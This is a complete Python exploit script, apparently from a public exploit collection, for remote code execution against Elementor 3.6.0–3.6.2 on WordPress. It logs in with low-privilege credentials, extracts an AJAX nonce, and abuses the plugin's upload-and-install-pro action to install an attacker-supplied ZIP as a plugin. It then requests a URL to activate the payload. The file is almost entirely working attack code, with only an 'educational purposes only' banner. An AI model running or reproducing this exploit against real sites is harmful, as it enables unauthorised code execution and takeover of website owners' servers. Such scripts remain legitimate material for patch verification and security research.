#!/usr/bin/python

# # # # # # # REMOTE CODE EXECUTION # # # # # # # 
# Exploit for the following WordPress plugin:	#
# Elementor 3.6.0/1/2 				#
# Exploit created by AkuCyberSec		#
# CVE-???					#
# # # # # # # # # # # # # # # # # # # # # # # # # 
#	Educational purposes only		#
#						#
#						#
#						#
# # # # # # # # # # # # # # # # # # # # # # # # # 

import requests
import re

# You can use the name you want for the ZIP archive
# The archive MUST contain a file named "elementor-pro.php" withing a folder named "elementor-pro"
payloadFileName = 'elementor-pro.zip'
baseUrl = 'http://192.168.56.103/wordpress/'
session = requests.Session()
cookies = { 'wordpress_test_cookie' : 'WP+Cookie+check' } # WordPress needs this to tell if browser can manage cookies

def DoLogin(username, password):
	global cookies
	loginUrl = baseUrl + 'wp-login.php'
	adminUrl = baseUrl + 'wp-admin/'
	data = { 'log' : username, 'pwd' : password, 'wp-submit' : 'Login', 'redirect_to' : adminUrl, 'testcookie' : 1 }
	
	# search for: "ajax":{"url":"http:\/\/192.168.56.103\/wordpress\/wp-admin\/admin-ajax.php","nonce":"4e8878bdba"}
	regexp = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"(.+)"\\}') 
	response = session.post(loginUrl, cookies=cookies, data=data)

	search = regexp.search(response.text)

	if not search:
		print('Error - Invalid credentials?')
		print(response.text)
	else:
		return search.group(1)

def UploadFile(fileName, nonce):
	uploadUrl = baseUrl + 'wp-admin/admin-ajax.php'
	data = { 'action' : 'elementor_upload_and_install_pro', '_nonce' : nonce }
	files = { 'fileToUpload' : open(fileName, 'rb') }
	regexp = re.compile('"elementorProInstalled":true') # search for: "elementorProInstalled":true
	response = session.post(uploadUrl, data=data, files=files)

	search = regexp.search(response.text)

	if not search:
		print ('Error - Upload failed')
		return False
	else:
		print ('Upload completed successfully!')
		return True

# Define YOUR method to activate your payload (if needed)
def ActivatePayload():
	payloadUrl = baseUrl + 'index.php?activate=1'
	session.get(payloadUrl)

	
print('Trying to login...')
nonce = DoLogin('guest', 'test')
print('Nonce found: ' + nonce)

print('Uploading payload...')
fileUploaded = UploadFile(payloadFileName, nonce)

# Define YOUR method to activate your payload (if needed)
if fileUploaded:
	print ('Activating payload...')
	ActivatePayload()
